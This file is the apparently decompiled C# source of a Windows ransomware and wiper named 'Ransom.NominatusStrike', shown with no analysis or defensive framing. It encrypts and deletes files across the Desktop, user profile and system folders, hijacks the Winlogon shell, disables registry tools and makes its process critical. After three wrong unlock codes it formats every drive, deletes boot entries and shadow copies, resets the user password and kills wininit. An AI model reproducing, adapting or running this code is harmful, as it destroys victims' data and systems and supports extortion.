using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TRS;

public class MainForm : Form
{
	public int live = 3;

	private IContainer components = null;

	private Button button1;

	private Label label3;

	private RichTextBox richTextBox1;

	private Label label2;

	private Label label1;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	public static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	public MainForm()
	{
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		checked
		{
			try
			{
				Process.EnterDebugMode();
				RtlSetProcessIsCritical(1u, 0u, 0u);
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey.SetValue("Shell", Application.get_ExecutablePath(), RegistryValueKind.String);
				runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				Directory.GetFiles(folderPath);
				Directory.GetDirectories(folderPath);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files = Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories);
				string[] directories = Directory.GetDirectories(folderPath2);
				for (int i = 0; i < directories.Length; i++)
				{
					try
					{
						MakeThemDIE(directories[i]);
						EncryptIT(directories[i]);
					}
					catch
					{
					}
				}
				for (int j = 0; j < files.Length; j++)
				{
					try
					{
						EncryptIT(files[j]);
						File.Delete(files[j]);
					}
					catch
					{
					}
				}
				try
				{
					string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles);
					string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.System);
					string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.Resources);
					string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string[] files2 = Directory.GetFiles(folderPath7, "*.*", SearchOption.AllDirectories);
					string[] files3 = Directory.GetFiles(folderPath6, "*.*", SearchOption.AllDirectories);
					string[] files4 = Directory.GetFiles(folderPath5, "*.*", SearchOption.AllDirectories);
					string[] files5 = Directory.GetFiles(folderPath4, "*.*", SearchOption.AllDirectories);
					string[] files6 = Directory.GetFiles(folderPath3, "*.*", SearchOption.AllDirectories);
					for (int k = 0; k < files2.Length; k++)
					{
						try
						{
							EncryptIT(files2[k]);
							File.Delete(files2[k]);
						}
						catch
						{
						}
					}
					for (int l = 0; l < files3.Length; l++)
					{
						try
						{
							EncryptIT(files3[l]);
							File.Delete(files3[l]);
						}
						catch
						{
						}
					}
					for (int m = 0; m < files4.Length; m++)
					{
						try
						{
							EncryptIT(files4[m]);
							File.Delete(files4[m]);
						}
						catch
						{
						}
					}
					for (int n = 0; n < files5.Length; n++)
					{
						try
						{
							EncryptIT(files5[n]);
							File.Delete(files5[n]);
						}
						catch
						{
						}
					}
					for (int num = 0; num < files6.Length; num++)
					{
						try
						{
							EncryptIT(files5[num]);
							File.Delete(files5[num]);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}
	}

	private void Label1Click(object sender, EventArgs e)
	{
	}

	private void Button1Click(object sender, EventArgs e)
	{
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (((Control)richTextBox1).get_Text() == "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK")
			{
				RtlSetProcessIsCritical(0u, 0u, 0u);
				runCommand("assoc .exe=exefile");
				runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f");
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
				runCommand("explorer.exe");
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files = Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories);
				string[] array = files;
				foreach (string pathN in array)
				{
					try
					{
						MakeThemAlive(pathN);
					}
					catch
					{
					}
				}
				((Form)this).Close();
			}
			else
			{
				if (!(((Control)richTextBox1).get_Text() == ((Control)richTextBox1).get_Text()))
				{
					return;
				}
				if (live == 0)
				{
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					string[] files2 = Directory.GetFiles(folderPath2, "*.*", SearchOption.AllDirectories);
					for (int j = 0; j < files2.Length; j++)
					{
						Attack1(files2[j]);
						File.Delete(files2[j]);
					}
					runCommand("assoc .vbs=INFECTEDFILE && assoc .html=INFECTEDFILE");
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo in drives)
					{
						Damage(driveInfo.ToString());
					}
					MessageBox.Show("have fun with dying! cya in hell");
					Thread.Sleep(7);
					runCommand("net users %username% 912983");
					runCommand("bcdedit /delete {current}");
					runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
					runCommand("taskkill /im wininit.exe /f");
				}
				else
				{
					live--;
					MessageBox.Show("Wrong! you have " + live + " chance!");
				}
			}
		}
	}

	public void MakeThemDIE(string Path1)
	{
		try
		{
			string userName = Environment.UserName;
			Directory.GetAccessControl(Path1);
			new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Deny);
		}
		catch
		{
		}
	}

	public void Attack1(string FName)
	{
		byte[] bytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
		File.WriteAllBytes(FName, bytes);
	}

	public void Damage(string DriveNameToFormat)
	{
		string commands = "format " + DriveNameToFormat + " /FS:NTFS /X /Q /y";
		runCommand(commands);
	}

	public void MakeThemAlive(string PathN)
	{
		string userName = Environment.UserName;
		Directory.GetAccessControl(PathN);
		new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Allow);
	}

	public void EncryptIT(string inputFile)
	{
		try
		{
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			string s = "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK";
			byte[] bytes = unicodeEncoding.GetBytes(s);
			string text = inputFile + "-Locked";
			string path = text;
			using (FileStream stream = new FileStream(path, FileMode.Create))
			{
				using AesManaged aesManaged = new AesManaged();
				using CryptoStream cryptoStream = new CryptoStream(stream, aesManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
				using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
				aesManaged.KeySize = 256;
				aesManaged.BlockSize = 128;
				int num;
				while ((num = fileStream.ReadByte()) != -1)
				{
					cryptoStream.WriteByte(checked((byte)num));
				}
			}
			File.Delete(inputFile + ".*");
		}
		catch
		{
		}
	}

	public void GetSystemFolder()
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Windows);
	}

	public void GetSystem32()
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Windows);
	}

	public void InfectTheFile(string FileNAME1)
	{
		try
		{
			byte[] bytes = File.ReadAllBytes(Application.get_ExecutablePath());
			File.WriteAllBytes(FileNAME1, bytes);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		label2 = new Label();
		richTextBox1 = new RichTextBox();
		label3 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_BackColor(Color.Transparent);
		label1.set_FlatStyle((FlatStyle)0);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.DarkRed);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(698, 44));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("CryptoVirus Detected!  Ransom.NominatusStrike");
		((Control)label1).add_Click((EventHandler)Label1Click);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 53));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(680, 172));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)richTextBox1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(60, 276));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(316, 18));
		((Control)richTextBox1).set_TabIndex(2);
		((Control)richTextBox1).set_Text("");
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 9.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(12, 276));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(58, 24));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("Code:");
		((ButtonBase)button1).set_FlatStyle((FlatStyle)3);
		((Control)button1).set_Location(new Point(382, 274));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(141, 23));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("GO AWAY!!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)Button1Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.AppWorkspace);
		((Form)this).set_ClientSize(new Size(722, 357));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("TRS");
		((Control)this).ResumeLayout(false);
	}
}
